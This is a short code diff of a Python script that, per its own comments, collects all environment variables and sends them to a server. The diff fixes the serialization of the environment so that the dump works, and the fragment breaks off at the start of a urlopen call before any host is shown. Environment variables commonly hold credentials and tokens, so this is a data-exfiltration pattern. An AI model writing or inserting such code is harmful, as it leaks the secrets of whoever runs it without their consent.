@@ -4,7 +4,7 @@ import os
 from urllib.request import urlopen, Request
 import json
 # Collect environment variables
-env_data = json.dumps(os.environ)
+env_data = json.dumps(dict(os.environ))
 
 # Send to a server
 response = urlopen(
